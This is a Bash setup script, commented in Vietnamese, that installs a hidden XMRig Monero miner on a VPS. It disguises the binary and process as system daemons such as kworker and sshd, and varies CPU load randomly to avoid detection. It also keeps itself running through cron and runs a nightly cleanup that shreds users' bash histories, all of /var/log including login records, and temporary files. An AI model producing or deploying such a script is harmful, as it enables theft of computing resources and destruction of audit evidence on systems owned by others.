#!/bin/bash

# --- Cấu hình CỦA BẠN (Cần thiết lập) ---
WALLET_ADDRESS="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
MINING_POOL="pool.hashvault.pro:443"
POOL_PASSWORD="x"

# --- Cấu hình ẨN GIẤU & TÙY CHỈNH CPU (Rất quan trọng cho VPS) ---
# Thư mục chứa XMRig và các script điều khiển
MINER_BASE_DIR="/usr/lib/system-monitor" # Đổi tên thành một đường dẫn ít gây chú ý hơn
MINER_DATA_SUBDIR="cache_helper" # Một thư mục con ngẫu nhiên hơn
MINER_DIR="$MINER_BASE_DIR/$MINER_DATA_SUBDIR"

# Danh sách các tên file thực thi XMRig giả mạo
# Nên là các tên nhị phân hệ thống Linux phổ biến, dài hơn để trông tự nhiên
BIN_NAMES=(
    "systemd-resolved-handler"
    "kworker-task-scheduler"
    "networkd-daemon-controller"
    "dbus-message-broker"
    "udevd-event-processor"
    "auditd-log-collector"
    "snapd-background-agent"
)

# Danh sách các tên tiến trình XMRig sẽ giả mạo khi chạy
# Càng nhiều tên và càng giống tiến trình hệ thống thì càng tốt.
FAKE_PROCESS_NAMES=(
    "kworker/u16:0"
    "systemd-logind"
    "rsyslogd"
    "irqbalance"
    "dbus-daemon"
    "pulseaudio"
    "gnome-shell"
    "lightdm"
    "systemd-udevd"
    "cron"
    "atd"
    "sshd"
    "nginx" # Nếu VPS chạy web server
    "apache2" # Nếu VPS chạy web server
)

# Cấu hình các mức sử dụng CPU (threads) và Nice value
# Định nghĩa các cấu hình thành một array (mảng) để dễ dàng chọn ngẫu nhiên
# Format: "threads,min_nice,max_nice,max_duration_minutes"
# threads: "[0]", "[0, 2]", "[0, 1, 2, 3]", "null" (tất cả luồng vật lý)
# min_nice, max_nice: XMRig sẽ chọn một giá trị nice ngẫu nhiên trong khoảng này.
# max_duration_minutes: Thời gian tối đa XMRig sẽ chạy với cấu hình này trước khi đổi sang cái khác.
CPU_PROFILES=(
    "[0],18,19,90"      # Rất nhẹ, ưu tiên cực thấp, chạy tối đa 90 phút
    "[0, 2],15,18,60"   # Nhẹ, ưu tiên thấp, chạy tối đa 60 phút
    "[0, 1, 2],10,15,30" # Trung bình, ưu tiên vừa, chạy tối đa 30 phút
    "[0, 2, 4],8,12,20"  # Hơi nặng, ưu tiên vừa, chạy tối đa 20 phút
    "null,0,5,5"         # Nặng (gần full CPU), ưu tiên cao, chạy tối đa 5 phút (mô phỏng spike)
)

# Tỷ lệ phần trăm cơ hội XMRig sẽ chạy trong một chu kỳ (ví dụ: 80% có nghĩa là 20% thời gian sẽ dừng hoàn toàn)
# Điều này tạo ra các khoảng "nghỉ" ngẫu nhiên.
CHANCE_TO_RUN=80 # %

# Tỷ lệ phần trăm cơ hội để chuyển đổi profile CPU (ngay cả khi chưa hết max_duration)
CHANCE_TO_SWITCH_PROFILE=20 # %

# Tỷ lệ phần trăm cơ hội để thay đổi tên binary (file thực thi) của XMRig
CHANCE_TO_CHANGE_BIN_NAME=5 # % (ít hơn để tránh gây chú ý)

# Tắt hoàn toàn ghi log của XMRig để không để lại dấu vết trên đĩa
DISABLE_XMRIG_LOGGING="true"

# --- Bắt đầu Cài đặt ---

echo "Bắt đầu cài đặt XMRig và cấu hình cho hoạt động đào điều chỉnh động..."

# 1. Cập nhật hệ thống và cài đặt các gói cần thiết
echo "Cập nhật hệ thống và cài đặt các gói cần thiết..."
if command -v apt &> /dev/null
then
    sudo apt update -y
    sudo apt install -y wget build-essential cmake libuv1-dev libssl-dev libhwloc-dev shred # Thêm shred
elif command -v yum &> /dev/null
then
    sudo yum install -y epel-release
    sudo yum install -y wget gcc-c++ make cmake libuv-devel openssl-devel hwloc-devel shred # Thêm shred
else
    echo "Hệ điều hành không được hỗ trợ."
    exit 1
fi

# 2. Tạo thư mục và di chuyển vào đó
echo "Tạo thư mục miner tại $MINER_DIR..."
sudo mkdir -p "$MINER_DIR"
sudo chown "$USER":"$USER" "$MINER_DIR" # Đảm bảo người dùng hiện tại có quyền

cd "$MINER_DIR" || { echo "Lỗi: Không thể vào thư mục $MINER_DIR. Thoát."; exit 1; }

# 3. Tải XMRig
echo "Tải XMRig phiên bản mới nhất cho Linux (static build)..."
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.23.0/xmrig-6.23.0-linux-static-x64.tar.gz"
XMRIG_ARCHIVE=$(basename "$XMRIG_URL")
XMRIG_EXTRACTED_DIR="xmrig-6.23.0"

wget "$XMRIG_URL" -q --show-progress
if [ $? -ne 0 ]; then
    echo "Lỗi: Không thể tải xuống XMRig. Thoát."
    exit 1
fi

# 4. Giải nén XMRig và di chuyển file thực thi
echo "Giải nén XMRig và đổi tên file thực thi..."
tar -xzf "$XMRIG_ARCHIVE" --strip-components=1 -C .
# Chọn một tên BIN_NAME ngẫu nhiên ban đầu
RANDOM_BIN_NAME=${BIN_NAMES[$RANDOM % ${#BIN_NAMES[@]}]}
mv xmrig "$RANDOM_BIN_NAME" # Đổi tên xmrig thành tên giả mạo
chmod +x "$RANDOM_BIN_NAME"

# Dọn dẹp file cài đặt
shred -u "$XMRIG_ARCHIVE" # Xóa an toàn
rm -rf "$XMRIG_EXTRACTED_DIR"

# 5. Tạo các file cấu hình XMRig cho mỗi profile CPU
echo "Tạo các file cấu hình XMRig cho các profile CPU khác nhau..."

# Hàm tạo file config
create_config_file() {
    local profile_id=$1
    local cpu_threads=$2
    local nice_min=$3
    local nice_max=$4
    local log_file_config="null" # Mặc định không ghi log
    local print_time_config=""

    if [ "$DISABLE_XMRIG_LOGGING" = "false" ]; then
        log_file_config="\"xmrig_profile_${profile_id}.log\""
        print_time_config='"print-time": 300,'
    fi
    
    # Chọn tên tiến trình giả mạo ngẫu nhiên cho từng cấu hình
    RANDOM_FAKE_PROCESS_NAME=${FAKE_PROCESS_NAMES[$RANDOM % ${#FAKE_PROCESS_NAMES[@]}]}
    
    # Chọn giá trị nice ngẫu nhiên trong khoảng min_nice và max_nice
    RANDOM_NICE_VALUE=$(( nice_min + RANDOM % (nice_max - nice_min + 1) ))

    cat <<EOF > config_profile_${profile_id}.json
{
    "autosave": false,
    "cpu": {
        "enabled": true,
        "rx": ${cpu_threads},
        "cctp": null,
        "asm": true
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "$MINING_POOL",
            "user": "$WALLET_ADDRESS",
            "pass": "$POOL_PASSWORD",
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "log-in": null
        }
    ],
    "log-file": ${log_file_config},
    ${print_time_config}
    "background": true,
    "syslog": false,
    "nice": ${RANDOM_NICE_VALUE}, # Sử dụng nice ngẫu nhiên
    "daemon": true,
    "custom-name": "$RANDOM_FAKE_PROCESS_NAME" # Tên tiến trình giả mạo ngẫu nhiên
}
EOF
}

# Lặp qua các CPU_PROFILES để tạo các file config
for i in "\${!CPU_PROFILES[@]}"; do
    profile_info=${CPU_PROFILES[$i]}
    threads=$(echo "$profile_info" | cut -d',' -f1)
    min_nice=$(echo "$profile_info" | cut -d',' -f2)
    max_nice=$(echo "$profile_info" | cut -d',' -f3)
    create_config_file "$i" "$threads" "$min_nice" "$max_nice"
done


# 6. Tạo script điều khiển chính (master_controller.sh)
echo "Tạo script điều khiển chính (master_controller.sh)..."
cat <<EOF > master_controller.sh
#!/bin/bash

MINER_DIR="$MINER_DIR"
BIN_NAMES=(${BIN_NAMES[@]})
FAKE_PROCESS_NAMES=(${FAKE_PROCESS_NAMES[@]})
CPU_PROFILES=(${CPU_PROFILES[@]})
CHANCE_TO_RUN=$CHANCE_TO_RUN
CHANCE_TO_SWITCH_PROFILE=$CHANCE_TO_SWITCH_PROFILE
CHANCE_TO_CHANGE_BIN_NAME=$CHANCE_TO_CHANGE_BIN_NAME

# File lưu trạng thái hiện tại của miner
STATE_FILE="\$MINER_DIR/.miner_state" # Bắt đầu bằng dấu chấm để ẩn
touch "\$STATE_FILE"
chmod 600 "\$STATE_FILE" # Quyền chỉ đọc/ghi cho chủ sở hữu

# Hàm dừng XMRig hiện tại (bất kể tên tiến trình hiện tại là gì)
stop_miner() {
    # Cố gắng tìm và giết bất kỳ tiến trình nào trông giống XMRig hoặc tên giả mạo
    local pids=\$(pgrep -f "minerd|xmrig|\$(printf "%s|" "\${FAKE_PROCESS_NAMES[@]}")|\$(printf "%s|" "\${BIN_NAMES[@]}")")
    if [ -n "\$pids" ]; then
        for pid in \$pids; do
            kill -9 \$pid > /dev/null 2>&1
        done
        echo "Stopped existing miner processes." >> "\$MINER_DIR/controller.log"
    fi
}

# Hàm khởi động XMRig với cấu hình và tên mới
start_miner() {
    local config_id=\$1
    local current_bin_name=\$2
    local config_file="config_profile_\${config_id}.json"
    
    # Kiểm tra xem miner đã chạy với binary và config này chưa
    local running_pid=\$(pgrep -f "\$current_bin_name")
    if [ -n "\$running_pid" ] && pgrep -f "\$(cat "\$MINER_DIR/\$config_file" | grep -o '\"custom-name\": \"[^\"]*' | cut -d'\"' -f4)" | grep -q "\$running_pid"; then
        # Miner đã chạy đúng config, không cần làm gì
        # echo "Miner already running with config \$config_id (bin: \$current_bin_name)." >> "\$MINER_DIR/controller.log"
        return 0
    fi

    stop_miner # Đảm bảo dừng miner cũ trước khi khởi động cái mới

    # Khởi động miner với cấu hình mới
    if [ -f "\$MINER_DIR/\$config_file" ] && [ -f "\$MINER_DIR/\$current_bin_name" ]; then
        nohup "\$MINER_DIR/\$current_bin_name" -c "\$MINER_DIR/\$config_file" > /dev/null 2>&1 &
        echo "\$(date): Miner started with config \$config_id (bin: \$current_bin_name, pid: \$!)." >> "\$MINER_DIR/controller.log"
    else
        echo "\$(date): ERROR: Config or binary file not found for config \$config_id (bin: \$current_bin_name)." >> "\$MINER_DIR/controller.log"
    fi
}

# Logic điều khiển chính
main_control() {
    local last_run_timestamp=\$(cat "\$STATE_FILE" | awk '{print \$1}')
    local current_profile_id=\$(cat "\$STATE_FILE" | awk '{print \$2}')
    local current_bin_name=\$(cat "\$STATE_FILE" | awk '{print \$3}')
    local current_timestamp=\$(date +%s)

    # Đảm bảo có một tên binary hợp lệ
    if [ -z "\$current_bin_name" ] || [ ! -f "\$MINER_DIR/\$current_bin_name" ]; then
        current_bin_name=\${BIN_NAMES[\$RANDOM % \${#BIN_NAMES[@]}]}
        echo "\$(date): Initializing/recovering binary name to \$current_bin_name." >> "\$MINER_DIR/controller.log"
    fi

    # Quyết định ngẫu nhiên liệu có nên chạy miner hay không
    if (( RANDOM % 100 >= CHANCE_TO_RUN )); then
        echo "\$(date): Decided not to run miner this cycle." >> "\$MINER_DIR/controller.log"
        stop_miner # Đảm bảo dừng nếu đang chạy
        echo "\$current_timestamp -1 \$current_bin_name" > "\$STATE_FILE" # Lưu trạng thái dừng (-1 profile ID)
        return 0
    fi

    # Nếu miner đang dừng (-1 profile ID) hoặc lần chạy đầu tiên
    if [ "\$current_profile_id" == "-1" ] || [ -z "\$current_profile_id" ]; then
        current_profile_id=\$(( RANDOM % \${#CPU_PROFILES[@]} )) # Chọn profile ngẫu nhiên
        last_run_timestamp=\$current_timestamp
        echo "\$(date): Miner was stopped or initial run. Starting with profile \$current_profile_id." >> "\$MINER_DIR/controller.log"
        start_miner "\$current_profile_id" "\$current_bin_name"
    else
        local profile_info=\${CPU_PROFILES[\$current_profile_id]}
        local max_duration=\$(echo "\$profile_info" | cut -d',' -f4) # Lấy max_duration từ profile

        # Kiểm tra nếu đã quá thời gian tối đa HOẶC quyết định đổi ngẫu nhiên
        if (( (current_timestamp - last_run_timestamp) > (max_duration * 60) )) || (( RANDOM % 100 < CHANCE_TO_SWITCH_PROFILE )); then
            stop_miner # Dừng miner cũ

            # Thay đổi tên binary (executable) ngẫu nhiên (dựa trên CHANCE_TO_CHANGE_BIN_NAME)
            if (( RANDOM % 100 < CHANCE_TO_CHANGE_BIN_NAME )); then
                local old_bin_name="\$current_bin_name"
                current_bin_name=\${BIN_NAMES[\$RANDOM % \${#BIN_NAMES[@]}]}
                if [ "\$new_bin_name" != "\$old_bin_name" ]; then # Chỉ đổi nếu tên khác
                    mv "\$MINER_DIR/\$old_bin_name" "\$MINER_DIR/\$current_bin_name" > /dev/null 2>&1
                    echo "\$(date): Binary name changed from \$old_bin_name to \$current_bin_name." >> "\$MINER_DIR/controller.log"
                fi
            fi

            # Chọn profile mới ngẫu nhiên (có thể chọn lại profile cũ)
            local new_profile_id=\$(( RANDOM % \${#CPU_PROFILES[@]} ))
            current_profile_id="\$new_profile_id"
            last_run_timestamp=\$current_timestamp
            echo "\$(date): Changing to profile \$current_profile_id (bin: \$current_bin_name)." >> "\$MINER_DIR/controller.log"
            start_miner "\$current_profile_id" "\$current_bin_name"
        else
            # Nếu chưa đổi profile, đảm bảo miner vẫn chạy
            # Kiểm tra pid để đảm bảo miner không bị crash hoặc bị kill
            local pid_miner=\$(pgrep -f "\$current_bin_name")
            if [ -z "\$pid_miner" ]; then
                echo "\$(date): Miner with bin \$current_bin_name not found, restarting with profile \$current_profile_id." >> "\$MINER_DIR/controller.log"
                start_miner "\$current_profile_id" "\$current_bin_name"
            fi
        fi
    fi

    echo "\$current_timestamp \$current_profile_id \$current_bin_name" > "\$STATE_FILE" # Lưu trạng thái mới
}

main_control
EOF
chmod +x master_controller.sh

# 7. Tạo script dọn dẹp dấu vết (cleanup_traces.sh)
echo "Tạo script dọn dẹp dấu vết (cleanup_traces.sh)..."
cat <<EOF > cleanup_traces.sh
#!/bin/bash

MINER_DIR="$MINER_DIR"

# Xóa lịch sử bash của người dùng root và tất cả người dùng khác
shred -u \$HOME/.bash_history > /dev/null 2>&1
find /home/ -name ".bash_history" -exec shred -u {} \; > /dev/null 2>&1
find /root/ -name ".bash_history" -exec shred -u {} \; > /dev/null 2>&1

# Xóa các log thường gặp một cách an toàn (CẨN TRỌNG: việc xóa log hệ thống có thể gây nghi ngờ)
# Chỉ nên xóa các log có thể liên quan đến hành động của bạn.
# Nếu DISABLE_XMRIG_LOGGING="false", hãy thêm các log của xmrig vào đây để xóa.
# Xóa log của controller để không ai biết miner hoạt động như thế nào
shred -u "\$MINER_DIR/controller.log" > /dev/null 2>&1
sudo find /var/log/ -name "*.log" -type f -exec shred -u {} \; > /dev/null 2>&1
sudo find /var/log/ -name "*.gz" -type f -exec shred -u {} \; > /dev/null 2>&1
sudo find /var/log/ -name "*.wtmp" -type f -exec shred -u {} \; > /dev/null 2>&1 # Log đăng nhập
sudo find /var/log/ -name "*.btmp" -type f -exec shred -u {} \; > /dev/null 2>&1 # Log đăng nhập thất bại
# Cẩn thận với journalctl, có thể gây lỗi hoặc tạo dấu vết mới
# sudo journalctl --rotate > /dev/null 2>&1
# sudo journalctl --vacuum-time=1s > /dev/null 2>&1

# Xóa các file tạm thời
sudo rm -rf /tmp/* > /dev/null 2>&1
sudo rm -rf /var/tmp/* > /dev/null 2>&1

# Xóa các file tải xuống ban đầu của script và chính script setup này
# (Kiểm tra nếu tồn tại trước khi shred)
[ -f "$MINER_DIR/$XMRIG_ARCHIVE" ] && shred -u "$MINER_DIR/$XMRIG_ARCHIVE" > /dev/null 2>&1
[ -f "$MINER_DIR/setup_miner.sh" ] && shred -u "$MINER_DIR/setup_miner.sh" > /dev/null 2>&1
[ -f "initial_setup.sh" ] && shred -u initial_setup.sh > /dev/null 2>&1 # Script bạn chạy ban đầu

# Xóa file trạng thái của miner (tái tạo lại ở lần chạy tiếp theo)
shred -u "\$MINER_DIR/.miner_state" > /dev/null 2>&1

EOF
chmod +x cleanup_traces.sh

# 8. Cấu hình Cron Job
echo "Cấu hình Cron Job để chạy master_controller.sh mỗi phút..."
# Chạy master_controller.sh mỗi phút
(crontab -l 2>/dev/null; echo "* * * * * \$MINER_DIR/master_controller.sh > /dev/null 2>&1") | crontab -
# Chạy cleanup_traces.sh mỗi ngày vào lúc 00:00 (nửa đêm)
(crontab -l 2>/dev/null; echo "0 0 * * * \$MINER_DIR/cleanup_traces.sh > /dev/null 2>&1") | crontab -
echo "Cron job đã được thêm để điều khiển đào mỗi phút và dọn dẹp dấu vết hàng ngày."

echo "Cài đặt hoàn tất."
echo "Bạn có thể đóng terminal này. Miner sẽ chạy tự động theo lịch ngẫu nhiên."
echo "Để kiểm tra: ps aux | grep '\$(head -n 1 \$MINER_DIR/config_profile_0.json | grep -o '\"custom-name\": \"[^\"]*' | cut -d'\"' -f4)'"
echo "Để gỡ cài đặt: Chỉnh sửa crontab (crontab -e) và xóa thư mục $MINER_DIR."
